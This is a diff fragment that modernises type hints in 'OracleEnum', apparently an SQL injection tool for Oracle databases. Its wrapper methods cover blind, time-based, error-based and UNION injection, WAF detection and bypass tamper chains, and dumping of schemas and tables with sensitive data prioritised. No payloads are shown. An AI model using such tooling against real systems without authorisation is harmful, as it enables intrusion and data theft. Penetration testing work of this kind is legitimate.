+        self, injection_point: str, column_count: int | None = None
+    ) -> int | None:
         """Get the best reflective column from data type detection."""
         return self.datatype_detector.get_reflective_column(
             injection_point, column_count
@@ -2209,14 +2200,14 @@ class OracleEnum:
         self.logger.info("[OracleEnum] Checking boolean blind vulnerability...")
         return self.blind_boolean_engine.is_boolean_vulnerable(injection_point)
 
-    def get_best_boolean_payload(self, injection_point: str) -> Optional[str]:
+    def get_best_boolean_payload(self, injection_point: str) -> str | None:
         """Get the best boolean payload."""
         self.logger.info("[OracleEnum] Getting best boolean payload...")
         return self.blind_boolean_engine.get_best_boolean_payload(injection_point)
 
     def compare_boolean_payloads(
         self, injection_point: str, true_payload: str, false_payload: str
-    ) -> Dict[str, Any]:
+    ) -> dict[str, Any]:
         """Compare true and false boolean payloads."""
         self.logger.info("[OracleEnum] Comparing boolean payloads...")
         return self.blind_boolean_engine.compare_true_false(
@@ -2228,7 +2219,7 @@ class OracleEnum:
     # ============================================================
 
     def detect_time_blind(
-        self, injection_point: str, delays: Optional[List[int]] = None
+        self, injection_point: str, delays: list[int] | None = None
     ) -> TimeBlindResult:
         """Detect time-based blind SQL injection."""
         self.logger.info("[OracleEnum] Detecting time blind SQL injection...")
@@ -2239,7 +2230,7 @@ class OracleEnum:
         self.logger.info("[OracleEnum] Checking time-based vulnerability...")
         return self.time_blind_engine.is_time_based_vulnerable(injection_point)
 
-    def get_best_time_payload(self, injection_point: str) -> Optional[str]:
+    def get_best_time_payload(self, injection_point: str) -> str | None:
         """Get the best time-based payload."""
         self.logger.info("[OracleEnum] Getting best time payload...")
         return self.time_blind_engine.get_best_time_payload(injection_point)
@@ -2247,7 +2238,7 @@ class OracleEnum:
     def measure_response_time(
         self,
         injection_point: str,
-        payload: Optional[str] = None,
+        payload: str | None = None,
         num_measurements: int = 3,
     ) -> float:
         """Measure response time for a payload."""
@@ -2271,12 +2262,12 @@ class OracleEnum:
         self.logger.info("[OracleEnum] Checking error-based vulnerability...")
         return self.error_based_engine.is_error_based(injection_point)
 
-    def get_best_error_payload(self, injection_point: str) -> Optional[str]:
+    def get_best_error_payload(self, injection_point: str) -> str | None:
         """Get the best error-based payload."""
         self.logger.info("[OracleEnum] Getting best error payload...")
         return self.error_based_engine.get_best_error_payload(injection_point)
 
-    def extract_error_data(self, injection_point: str, payload: str) -> List[str]:
+    def extract_error_data(self, injection_point: str, payload: str) -> list[str]:
         """Extract data from error message using a payload."""
         self.logger.info("[OracleEnum] Extracting error data...")
         return self.error_based_engine.extract_error_data(injection_point, payload)
@@ -2285,24 +2276,24 @@ class OracleEnum:
     # Phase 14: WAF Methods
     # ============================================================
 
-    def detect_waf(self, injection_point: Optional[str] = None) -> WAFDetectionResult:
+    def detect_waf(self, injection_point: str | None = None) -> WAFDetectionResult:
         """Detect and fingerprint WAF."""
         self.logger.info("[OracleEnum] Detecting WAF...")
         return self.waf_detector.detect(injection_point)
 
-    def is_waf_present(self, injection_point: Optional[str] = None) -> bool:
+    def is_waf_present(self, injection_point: str | None = None) -> bool:
         """Check if WAF is present."""
         self.logger.info("[OracleEnum] Checking WAF presence...")
         return self.waf_detector.is_waf_present(injection_point)
 
-    def get_waf_name(self, injection_point: Optional[str] = None) -> Optional[str]:
+    def get_waf_name(self, injection_point: str | None = None) -> str | None:
         """Get detected WAF name."""
         self.logger.info("[OracleEnum] Getting WAF name...")
         return self.waf_detector.get_waf_name(injection_point)
 
     def get_waf_bypass_recommendations(
-        self, injection_point: Optional[str] = None
-    ) -> List[str]:
+        self, injection_point: str | None = None
+    ) -> list[str]:
         """Get WAF bypass recommendations."""
         self.logger.info("[OracleEnum] Getting WAF bypass recommendations...")
         return self.waf_detector.get_bypass_recommendations(injection_point)
@@ -2316,17 +2307,17 @@ class OracleEnum:
         self.logger.info(f"[OracleEnum] Applying tamper: {tamper_name}")
         return self.tamper_engine.apply(payload, tamper_name)
 
-    def apply_tamper_chain(self, payload: str, tamper_chain: List[str]) -> TamperResult:
+    def apply_tamper_chain(self, payload: str, tamper_chain: list[str]) -> TamperResult:
         """Apply multiple tampers in sequence."""
         self.logger.info(f"[OracleEnum] Applying tamper chain: {tamper_chain}")
         return self.tamper_engine.apply_chain(payload, tamper_chain)
 
-    def recommend_tampers(self, waf_name: str) -> List[str]:
+    def recommend_tampers(self, waf_name: str) -> list[str]:
         """Recommend tampers for a specific WAF."""
         self.logger.info(f"[OracleEnum] Getting tamper recommendations for: {waf_name}")
         return self.tamper_engine.recommend_tampers(waf_name)
 
-    def list_tampers(self) -> List[str]:
+    def list_tampers(self) -> list[str]:
         """List all available tamper methods."""
         self.logger.info("[OracleEnum] Listing available tampers")
         return self.tamper_engine.list_tampers()
@@ -2346,20 +2337,20 @@ class OracleEnum:
     # ============================================================
 
     def exploit_union(
-        self, injection_point: str, waf_name: Optional[str] = None
+        self, injection_point: str, waf_name: str | None = None
     ) -> UnionExploitResult:
         """Perform UNION-based SQL injection exploitation."""
         self.logger.info("[OracleEnum] Starting UNION exploitation...")
         return self.union_exploiter.exploit(injection_point, waf_name)
 
     def find_working_payload(
-        self, injection_point: str, waf_name: Optional[str] = None
-    ) -> Optional[str]:
+        self, injection_point: str, waf_name: str | None = None
+    ) -> str | None:
         """Find a working UNION payload."""
         self.logger.info("[OracleEnum] Finding working payload...")
         return self.union_exploiter.find_best_payload(injection_point, waf_name)
 
-    def get_best_union_payload(self) -> Optional[str]:
+    def get_best_union_payload(self) -> str | None:
         """Get the best working UNION payload."""
         self.logger.info("[OracleEnum] Getting best UNION payload...")
         return self.union_exploiter.get_best_payload()
@@ -2385,9 +2376,9 @@ class OracleEnum:
         injection_point: str,
         max_schemas: int = 20,
         max_tables: int = 50,
-        max_rows: Optional[int] = None,
-        blacklist: Optional[Set[str]] = None,
-        whitelist: Optional[Set[str]] = None,
+        max_rows: int | None = None,
+        blacklist: set[str] | None = None,
+        whitelist: set[str] | None = None,
         prioritize_sensitive: bool = True,
         resume: bool = False,
     ) -> DatabaseDumpResult:
@@ -2412,8 +2403,8 @@ class OracleEnum:
         injection_point: str,
         schema: str,
         table: str,
-        max_rows: Optional[int] = None,
-    ) -> List[Dict[str, Any]]:
+        max_rows: int | None = None,
+    ) -> list[dict[str, Any]]:
         """Dump a single table."""
         self.logger.info(f"[OracleEnum] Dumping table: {schema}.{table}")
         dumper = self._ensure_dumper(injection_point)
@@ -2423,9 +2414,9 @@ class OracleEnum:
         self,
         injection_point: str,
         schema: str,
-        tables: Optional[List[str]] = None,
-        max_rows: Optional[int] = None,
-    ) -> Dict[str, List[Dict[str, Any]]]:
+        tables: list[str] | None = None,
+        max_rows: int | None = None,
+    ) -> dict[str, list[dict[str, Any]]]:
         """Dump all tables in a schema."""
         self.logger.info(f"[OracleEnum] Dumping schema: {schema}")
         dumper = self._ensure_dumper(injection_point)
@@ -2439,7 +2430,7 @@ class OracleEnum:
             return ""
         return dumper.export_json(dumper.dump_result, output_path)
 
-    def export_dump_csv(self, injection_point: str, output_dir: str) -> List[str]:
+    def export_dump_csv(self, injection_point: str, output_dir: str) -> list[str]:
         """Export dump to CSV files."""
         dumper = self._ensure_dumper(injection_point)
         if dumper.dump_result is None:
@@ -2463,7 +2454,7 @@ class OracleEnum:
             return ""
         return dumper.export_markdown(dumper.dump_result, output_path)
 
-    def get_dump_progress(self, injection_point: str) -> Dict[str, Any]:
+    def get_dump_progress(self, injection_point: str) -> dict[str, Any]:
         """Get current dump progress."""
         dumper = self._ensure_dumper(injection_point)
         return dumper.track_progress()
